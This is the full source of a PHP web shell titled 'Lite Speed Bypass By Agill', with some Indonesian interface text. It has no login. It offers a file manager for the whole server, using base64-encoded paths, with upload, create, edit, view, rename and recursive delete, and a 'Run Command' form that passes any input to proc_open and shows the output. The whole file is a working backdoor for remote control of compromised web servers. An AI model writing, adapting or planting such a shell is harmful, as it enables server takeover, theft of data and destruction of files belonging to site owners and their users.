<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lite Speed By Agill</title>
    <link href="https://fonts.googleapis.com/css?family=Arial+Black&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-900 text-white font-sans">
<div class="container mx-auto p-4">
    <?php
    $timezone = date_default_timezone_get();
    date_default_timezone_set($timezone);
    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
    $scriptDirectory = dirname(__FILE__);

    function x($b) {
        return base64_encode($b);
    }

    function y($b) {
        return base64_decode($b);
    }

    foreach ($_GET as $c => $d) $_GET[$c] = y($d);

    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
    chdir($currentDirectory);

    $viewCommandResult = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_FILES['fileToUpload'])) {
            $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " Upload success";
            } else {
                echo "Sorry, there was an error uploading your file.";
            }
        } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
            if (!file_exists($newFolder)) {
                mkdir($newFolder);
                echo '<hr>Folder created successfully!';
            } else {
                echo '<hr>Error: Folder already exists!';
            }
        } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
            $fileName = $_POST['file_name'];
            $newFile = $currentDirectory . '/' . $fileName;
            if (!file_exists($newFile)) {
                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                    echo '<hr>File created successfully!';
                } else {
                    echo '<hr>Error: Failed to create file!';
                }
            } else {
                if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                    echo '<hr>File edited successfully!';
                } else {
                    echo '<hr>Error: Failed to edit file!';
                }
            }
        } elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
            if (file_exists($fileToDelete)) {
                if (is_dir($fileToDelete)) {
                    if (deleteDirectory($fileToDelete)) {
                        echo '<hr>Folder deleted successfully!';
                    } else {
                        echo '<hr>Error: Failed to delete folder!';
                    }
                } else {
                    if (unlink($fileToDelete)) {
                        echo '<hr>File deleted successfully!';
                    } else {
                        echo '<hr>Error: Failed to delete file!';
                    }
                }
            } else {
                echo '<hr>Error: File or directory not found!';
            }
        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldName = $currentDirectory . '/' . $_POST['old_name'];
            $newName = $currentDirectory . '/' . $_POST['new_name'];
            if (file_exists($oldName)) {
                if (rename($oldName, $newName)) {
                    echo '<hr>Item renamed successfully!';
                } else {
                    echo '<hr>Error: Failed to rename item!';
                }
            } else {
                echo '<hr>Error: Item not found!';
            }
        } elseif (isset($_POST['cmd_input'])) {
            $command = $_POST['cmd_input'];
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = proc_open($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                $errors = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                if (!empty($errors)) {
                    $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box w-full p-2 bg-gray-800 text-gray-300 border border-gray-600 rounded-md" readonly>' . htmlspecialchars($errors) . '</textarea>';
                } else {
                    $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box w-full p-2 bg-gray-800 text-gray-300 border border-gray-600 rounded-md" readonly>' . htmlspecialchars($output) . '</textarea>';
                }
            } else {
                $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
            }
        } elseif (isset($_POST['view_file'])) {
            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($fileToView)) {
                $fileContent = file_get_contents($fileToView);
                $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box w-full p-2 bg-gray-800 text-gray-300 border border-gray-600 rounded-md" readonly>' . htmlspecialchars($fileContent) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Error: File not found!</p>';
            }
        }
    }

    echo '<div class="text-center mb-8">
            <h1 class="text-4xl font-bold">Lite Speed Bypass By Agill</h1>
            <p class="text-lg italic">v.1.3</p>
        </div>';
    echo "<p>Zona waktu server: " . $timezone . "</p>";
    echo "<p>Waktu server saat ini: " . date('Y-m-d H:i:s') . "</p>";
    echo '<hr class="my-4">';
    echo '<div class="mb-4">curdir: ';

    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    $homeLinkPrinted = false;
    foreach ($directories as $index => $dir) {
        $currentPath .= DIRECTORY_SEPARATOR . $dir;
        if ($index == 0) {
            echo ' / <a href="?d=' . x($currentPath) . '" class="text-blue-400">' . $dir . '</a>';
        } else {
            echo ' / <a href="?d=' . x($currentPath) . '" class="text-blue-400">' . $dir . '</a>';
        }
    }

    echo ' / <a href="?d=' . x($scriptDirectory) . '" class="text-green-400">[ GO Home ]</a>';
    echo '</div>';
    echo '<hr class="my-4">';

    echo '<div class="flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4 mb-8">';
    echo '<button onclick="openModal(\'createFolderModal\')" class="w-full p-2 bg-green-500 text-white rounded-md">Create Folder</button>';
    echo '<button onclick="openModal(\'createEditFileModal\')" class="w-full p-2 bg-blue-500 text-white rounded-md">Create / Edit File</button>';
    echo '<button onclick="openModal(\'uploadFileModal\')" class="w-full p-2 bg-yellow-500 text-white rounded-md">Upload File</button>';
    echo '<button onclick="openModal(\'runCommandModal\')" class="w-full p-2 bg-red-500 text-white rounded-md">Run Command</button>';
    echo '</div>';

    echo $viewCommandResult;

    echo '<div>';
    echo '</div>';
    echo '<div class="overflow-x-auto max-w-full">';
    echo '<table class="table-auto w-full bg-gray-800 text-gray-300 border border-gray-600 rounded-md">';
    echo '<thead><tr class="bg-gray-700"><th class="px-4 py-2">Item Name</th><th class="px-4 py-2">Size</th><th class="px-4 py-2">Date</th><th class="px-4 py-2">Permissions</th><th class="px-4 py-2">View</th><th class="px-4 py-2">Delete</th><th class="px-4 py-2">Rename</th></tr></thead>';
    echo '<tbody>';
    foreach (scandir($currentDirectory) as $v) {
        $u = realpath($v);
        $s = stat($u);
        $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?d=' . x($currentDirectory) . '&f=' . x($v);
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        echo '<tr class="' . ($writable ? 'bg-gray-600' : 'bg-gray-700') . '">
                <td class="border px-4 py-2"><a href="' . $itemLink . '" class="text-blue-400">' . $v . '</a></td>
                <td class="border px-4 py-2">' . filesize($u) . '</td>
                <td class="border px-4 py-2">' . date('Y-m-d H:i:s', filemtime($u)) . '</td>
                <td class="border px-4 py-2">' . $permission . '</td>
                <td class="border px-4 py-2"><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="view_file" value="' . htmlspecialchars($v) . '"><input type="submit" value="View" class="bg-blue-500 text-white rounded-md p-2"></form></td>
                <td class="border px-4 py-2"><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="delete_file" value="' . htmlspecialchars($v) . '"><input type="submit" value="Delete" class="bg-red-500 text-white rounded-md p-2"></form></td>
                <td class="border px-4 py-2"><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '"><input type="hidden" name="old_name" value="' . htmlspecialchars($v) . '"><input type="text" name="new_name" placeholder="New Name" class="w-full p-2 bg-gray-800 text-gray-300 border border-gray-600 rounded-md"><input type="submit" name="rename_item" value="Rename" class="w-full p-2 bg-yellow-500 text-white rounded-md"></form></td>
            </tr>';
    }
    echo '</tbody></table></div>';
    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }
    ?>
</div>

<!-- Create Folder Modal -->
<div id="createFolderModal" class="fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
    <div class="bg-gray-800 p-4 rounded-lg shadow-lg max-w-sm w-full">
        <h2 class="text-xl mb-4">Create Folder</h2>
        <form method="post">
            <input type="text" name="folder_name" placeholder="Folder Name" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md">
            <div class="flex space-x-4">
                <button type="button" onclick="closeModal('createFolderModal')" class="w-full p-2 bg-red-500 text-white rounded-md">Cancel</button>
                <button type="submit" class="w-full p-2 bg-green-500 text-white rounded-md">Create</button>
            </div>
        </form>
    </div>
</div>

<!-- Create / Edit File Modal -->
<div id="createEditFileModal" class="fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
    <div class="bg-gray-800 p-4 rounded-lg shadow-lg max-w-sm w-full">
        <h2 class="text-xl mb-4">Create / Edit File</h2>
        <form method="post">
            <input type="text" name="file_name" placeholder="File Name" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md">
            <textarea name="file_content" placeholder="File Content" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md"></textarea>
            <div class="flex space-x-4">
                <button type="button" onclick="closeModal('createEditFileModal')" class="w-full p-2 bg-red-500 text-white rounded-md">Cancel</button>
                <button type="submit" class="w-full p-2 bg-blue-500 text-white rounded-md">Save</button>
            </div>
        </form>
    </div>
</div>

<!-- Upload File Modal -->
<div id="uploadFileModal" class="fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
    <div class="bg-gray-800 p-4 rounded-lg shadow-lg max-w-sm w-full">
        <h2 class="text-xl mb-4">Upload File</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" id="fileToUpload" placeholder="Select file:" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md">
            <div class="flex space-x-4">
                <button type="button" onclick="closeModal('uploadFileModal')" class="w-full p-2 bg-red-500 text-white rounded-md">Cancel</button>
                <button type="submit" name="submit" class="w-full p-2 bg-yellow-500 text-white rounded-md">Upload</button>
            </div>
        </form>
    </div>
</div>

<!-- Run Command Modal -->
<div id="runCommandModal" class="fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center hidden">
    <div class="bg-gray-800 p-4 rounded-lg shadow-lg max-w-sm w-full">
        <h2 class="text-xl mb-4">Run Command</h2>
        <form method="post">
            <input type="text" name="cmd_input" placeholder="Enter command" class="w-full p-2 mb-4 bg-gray-700 text-gray-300 border border-gray-600 rounded-md">
            <div class="flex space-x-4">
                <button type="button" onclick="closeModal('runCommandModal')" class="w-full p-2 bg-red-500 text-white rounded-md">Cancel</button>
                <button type="submit" class="w-full p-2 bg-red-500 text-white rounded-md">Run</button>
            </div>
        </form>
    </div>
</div>

<script>
    function openModal(modalId) {
        document.getElementById(modalId).classList.remove('hidden');
    }

    function closeModal(modalId) {
        document.getElementById(modalId).classList.add('hidden');
    }
</script>
</body>
</html>
